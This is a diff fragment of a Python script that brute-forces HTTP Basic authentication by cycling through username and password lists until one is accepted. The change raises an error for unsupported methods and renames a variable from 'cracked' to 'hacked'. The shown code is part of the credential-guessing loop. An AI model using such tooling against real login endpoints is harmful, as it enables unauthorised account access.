@@ -57,7 +57,7 @@ def bruteforce_basic_auth(url, login, password, method='GET', post_data='',
             resp = requests.post(url, data=post_data,
                                  headers={'Authorization': auth_header})
         else:
-            return
+            raise Exception('Unsupported HTTP method')
         if resp.status_code != error_code:
             return True
     except Exception as e:
@@ -101,10 +101,10 @@ for i, user in enumerate(usernames):
             raise Exception('POST data is given with a wrong HTTP method')
         if options.method != 'GET' and options.method != 'POST':
             raise Exception('Unsupported HTTP method')
-        cracked = bruteforce_basic_auth(url, user, passwd,
+        hacked = bruteforce_basic_auth(url, user, passwd,
                                         method=options.method,
                                         post_data=options.post_data)
-        if cracked:
+        if hacked:
             print(f'Found valid credentials: [{user}/{passwd}]')
             exit(0)
         counter += 1
